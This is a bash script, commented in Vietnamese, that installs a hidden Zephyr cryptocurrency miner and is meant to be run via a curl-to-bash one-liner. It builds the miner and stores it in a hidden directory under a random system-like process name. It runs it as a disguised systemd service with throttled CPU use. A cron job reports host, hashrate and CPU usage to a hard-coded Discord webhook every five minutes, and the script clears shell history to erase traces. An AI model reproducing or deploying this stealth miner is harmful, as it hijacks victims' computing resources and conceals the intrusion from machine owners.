#!/bin/bash
# bash <(curl -sSL https://raw.githubusercontent.com/DucManh206/rawtext/main/miner_v3.sh)

# ========== CONFIG ==========
WALLET="47xooGnFD6CLUExhWnGEhaLZwpfsAXRw47pqQcFNVc19FewwwvdEdB65CuL8DNXu5pXbsYfVxvQxg6UN6DgPnhaKS87pkEA"  # Đổi thành ví Zephyr của bạn
POOL="pool.hashvault.pro:443"  # Đổi thành pool hỗ trợ Zephyr (tìm pool của Zephyr)
DISCORD_WEBHOOK="https://discord.com/api/webhooks/1362822972834058501/Dj0h8PPMOswXyqjkfhu7TC6qmx260xmLkx1rOotX9KA9pA-ktUVY0mf7ZMiyzShq5JE4"
WORKER="silent_$(hostname)"

TOTAL_CORES=$(nproc)
CPU_THREADS=$(awk "BEGIN {print int($TOTAL_CORES * 0.7)}")
PRIORITY=3

CUSTOM_NAME=$(shuf -n1 -e "dbusd" "syscore" "logworker" "udevd" "corelogd")
INSTALL_DIR="$HOME/.local/share/.cache/.dbus"
SERVICE_NAME=$(shuf -n1 -e "logrotate" "system-fix" "netcore" "kernel-agent")
LOG_FILE="/tmp/zephyr-performance.log"
# ============================

echo "💻 Đang cài đặt Zephyr stealth + gửi log Discord mỗi 5p..."

# Cài thư viện cần thiết
sudo apt update
sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev curl

# Clone và build miner cho Zephyr (zephyr-miner hoặc XMRig có thể hỗ trợ cho Zephyr)
cd ~
rm -rf zephyr-miner
git clone https://github.com/zephyr-project/zephyr-miner.git  # Hoặc thay bằng repo hỗ trợ Zephyr mining
cd zephyr-miner
mkdir build && cd build
cmake .. -DCMAKE_BUILD_TYPE=Release
make -j$TOTAL_CORES

# Tạo thư mục ẩn và copy binary
mkdir -p "$INSTALL_DIR"
cp ./zephyr-miner "$INSTALL_DIR/$CUSTOM_NAME"
chmod +x "$INSTALL_DIR/$CUSTOM_NAME"

# Tạo systemd service ngụy trang
sudo tee /etc/systemd/system/$SERVICE_NAME.service > /dev/null << EOF
[Unit]
Description=Core Daemon
After=network.target

[Service]
ExecStart=$INSTALL_DIR/$CUSTOM_NAME -o $POOL -u $WALLET.$WORKER -k --coin zephyr --tls \\
  --cpu-priority=$PRIORITY --threads=$CPU_THREADS --donate-level=0 \\
  --max-cpu-usage=65 --log-file=$LOG_FILE
Restart=always
Nice=10

[Install]
WantedBy=multi-user.target
EOF

# Kích hoạt service
sudo systemctl daemon-reload
sudo systemctl enable $SERVICE_NAME
sudo systemctl start $SERVICE_NAME

# Tạo script gửi log hiệu suất
tee "$INSTALL_DIR/logminer.sh" > /dev/null << EOF
#!/bin/bash
WEBHOOK="$DISCORD_WEBHOOK"
PROCESS_NAME="$CUSTOM_NAME"
HOST="\$(hostname)"
HASHRATE="Unknown"
LOG_FILE="$LOG_FILE"

if [ -f "\$LOG_FILE" ]; then
  HASHRATE=\$(grep -i "speed" "\$LOG_FILE" | tail -n1 | grep -oE "[0-9]+.[0-9]+ h/s")
fi

CPU_USAGE=\$(top -bn1 | grep "Cpu(s)" | awk '{print \$2 + \$4}')
UPTIME=\$(uptime -p)
THREADS=\$(nproc)

curl -s -H "Content-Type: application/json" -X POST -d "{
  \\"username\\": \\"Zephyr Miner Status\\",
  \\"content\\": \\"📟 \\\`\$HOST\\\` đang đào Zephyr\\n⚙️ Process: \\\`$CUSTOM_NAME\\\`\\n🧠 Threads: \\\`\$THREADS\\\`\\n💨 Hashrate: \\\`\$HASHRATE\\\`\\n📈 CPU Usage: \\\`\${CPU_USAGE}%\\\`\\n⏱️ Uptime: \\\`\$UPTIME\\\`\\"
}" "\$WEBHOOK" > /dev/null 2>&1
EOF

chmod +x "$INSTALL_DIR/logminer.sh"

# Tạo cron gửi log mỗi 5 phút
(crontab -l 2>/dev/null; echo "*/5 * * * * $INSTALL_DIR/logminer.sh") | crontab -

# Gửi ping đầu tiên về Discord
"$INSTALL_DIR/logminer.sh"

# Xoá dấu vết
cd ~
rm -rf zephyr-miner
history -c

echo ""
echo "✅ Bắt Đầu Đào Zephyr, log sẽ gửi về Discord mỗi 5 phút! 🚀"

# Cài và mở htop để theo dõi hiệu suất
if ! command -v htop >/dev/null 2>&1; then
    echo "📦 Đang cài đặt htop"
    sudo apt install -y htop
fi
exec htop
